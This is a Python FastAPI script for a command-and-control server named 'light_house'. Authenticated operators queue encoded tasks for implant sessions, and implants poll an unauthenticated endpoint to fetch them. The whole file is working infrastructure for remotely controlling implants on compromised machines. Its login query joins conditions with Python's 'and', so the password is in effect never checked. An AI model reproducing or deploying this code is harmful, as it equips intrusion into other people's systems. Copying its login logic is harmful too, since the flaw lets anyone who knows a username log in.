#!/usr/bin/python3
import argparse
import base64
import binascii
import uvicorn
import re
from jose import JWTError, jwt
from datetime import datetime, timedelta, timezone
from typing import List

from fastapi import FastAPI, HTTPException, status, Depends, Security
from fastapi.security import OAuth2PasswordRequestForm
from fastapi.responses import RedirectResponse

# local imports
from server_helper.auth_helper import Token, oauth2_scheme
from server_helper.auth_helper import SECRET_KEY, ALGORITHM, ACCESS_TOKEN_EXPIRE_MINUTES

from server_helper.user_helper import Users, UserCreate, UserRead, UserDelete
from server_helper.db import Base, SessionLocal

from server_helper.db import get_db
from server_helper.auth_helper import verify_token
from server_helper.auth_helper import create_access_token

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
from server_helper.tasking_helper import (
    Tasking,
    TaskingCreate,
    TaskingRead,
    TaskingDelete,
)

from server_helper.results_helper import (
    Results,
    ResultsCreate,
    ResultsRead,
    ResultsDelete,
)

from server_helper.lighthouse_config import *

app = FastAPI()
from routes.user_routes import router as user_router
from routes.health_routes import router as health_router
from routes.results_routes import router as results_router
from routes.implant_routes import router as implant_router

app.include_router(user_router)
app.include_router(health_router)
app.include_router(results_router)
app.include_router(implant_router)


# for client only to be able to access protected endpoints, authentication via OAuth2
@app.post("/token/", response_model=Token)
def login(
    db: SessionLocal = Depends(get_db),  # type: ignore
    form_data: OAuth2PasswordRequestForm = Depends(),
):
    user_exists = (
        db.query(Users)
        .filter(
            Users.username == form_data.username
            and Users.password == form_data.password
        )
        .first()
    )
    if not user_exists:
        raise HTTPException(status_code=401, detail="Invalid username or password")
    access_token = create_access_token(data={"sub": form_data.username})
    return {"access_token": access_token, "token_type": "bearer"}


# PROTECTED endpoint in order to create a task for an implant (client -> server)
@app.post("/tasking/{session}", response_model=TaskingCreate)
def create_tasking(
    session: str,
    tasking: TaskingCreate,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    """
    The endpoint where merchant will submit tasking requests to lighthouse for the agent to pick up and action
    :param session: The session id we should associate with for the tasking request
    :param tasking: The json blob containing the valid tasking request
    :param db: The active database connection
    :param token: The token used to authenticate a merchant to lighthouse
    :return db_task: The json tasking information, 404 if the session is not found, 400 if the
    arguments are not valid for the tasking request
    """
    verify_token(token)
    current_time = datetime.now(timezone.utc).isoformat()
    # Check if the session exists
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    # Decode the arguments from base64(hex) if provided
    if tasking.args:
        try:
            args_bytes = bytes.fromhex(tasking.args)
            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    # Dump model data excluding fields that will be manually set
    tasking_data = tasking.model_dump(exclude={"session", "complete", "date"})
    # Override 'args' with decoded version
    tasking_data["args"] = decoded_args
    # Create new task
    db_task = Tasking(
        **tasking_data, session=session, date=current_time, complete="False"
    )
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task


# PROTECTED endpoint for client to retrieve taskings
@app.get("/tasking/{session}", response_model=List[TaskingRead])
def read_taskings(
    session: str,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    tasking = (
        db.query(Tasking)
        .filter(
            Tasking.session == session,
            Tasking.complete.in_(["False", "Pending", "True"]),
        )
        .all()
    )
    return tasking


# endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
@app.get("/tasks/{session}", response_model=List[TaskingRead])
def get_tasks(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")

    tasking = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.complete.in_(["False", "Pending"]))
        .all()
    )
    if not tasking:
        raise HTTPException(status_code=404, detail="No tasks found for this session")
    # Mark tasks as pending
    for task in tasking:
        # implant picked it up for action
        task.complete = "Pending"
        db.commit()
        db.refresh(task)

    return tasking


if __name__ == '__main__':
    opts = argparse.ArgumentParser(description="light_house server application")
    opts.add_argument("-c", "--config", help="the light_house config file containing runtime variables", required=True, type=str, default="lighthouse.conf", dest="config")
    args = opts.parse_args()
    
    conf = parse_config(args.config)
    web_server = parse_config_vals(conf)
    uvicorn.run(app, host=web_server.listen_host, port=web_server.listen_port, ssl_certfile=web_server.server_crt, ssl_keyfile=web_server.server_key)

